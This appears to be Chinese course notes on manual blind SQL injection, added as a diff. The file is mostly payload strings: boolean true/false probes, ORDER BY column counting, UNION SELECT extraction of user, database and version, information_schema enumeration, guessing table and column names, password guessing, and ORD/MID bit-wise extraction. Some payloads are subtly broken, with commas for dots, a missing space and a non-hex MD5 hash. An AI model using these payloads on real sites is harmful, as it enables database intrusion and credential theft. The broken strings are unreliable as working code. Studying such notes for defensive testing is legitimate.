@@ -1,0 +1,51 @@
+课时91 手动漏洞挖掘-SQL盲注
+
+手动漏洞挖掘-----SQL盲注
+不显示数据库内建的报错信息
+    内建的报错信息帮助开发人员发现和修复问题
+    报错信息提供关于系统的大量有用信息
+当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将
+无法依据报错信息判断注入语句的执行结果，即 盲
+思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断
+    1'and 1=1--+
+    1'and 1=2--+
+
+select * from table_name where id='1' orderby 2--';
+
+课时91 手动漏洞挖掘-SQL盲注
+1'order by 5--+
+1'order by 3--+
+
+1'union select 1,2--+
+1'union select null,CONCAT_WS(CHAR(32,58.32),user(),database(),version())--+
+1'and 1=0 union select null,table_name from information_schema,table#
+1'and 1=0 union select null,table_name from information_schema,columns where table_name='user'#
+
+手动漏洞挖掘-----SQL注入
+无权读取information_schema库 / 拒绝union、orderby语句
+    猜列明: 1'and column not null--+
+         Burp suite自动猜列名
+    猜当前表表名: 1'and table user not null--+
+    猜库里其他表: 1'and (select count(*) from table)>0--+
+    列表对应关系: 1'and user.user not null--+
+    猜字段内容: 1' and user='admin
+                1' or user like '%a%
+    猜账号对应密码: 
+        2'or user='admin' and password='5f4dcc3b5aa765d61d8327dev832cf99
+Burpsuit自动化猜解内容
+
+手动漏洞挖掘-----SQL注入盲注
+开个脑洞
+    真实案例：某电商网站
+    http://1.1.1.1/goods.php?cnt=1&goodsid=123
+    and 1=1--+    显示一包面巾纸
+    and 1=2--+    显示一袋洗衣粉
+
+    1'and ORD(MID((VERSION()),1,1))&1>0--
+    CURRENT_USER()、DATABASE()
+    MID(ColumnName,Start[,Length])
+    ORD（string)  #ASCII码
+
+
+
+
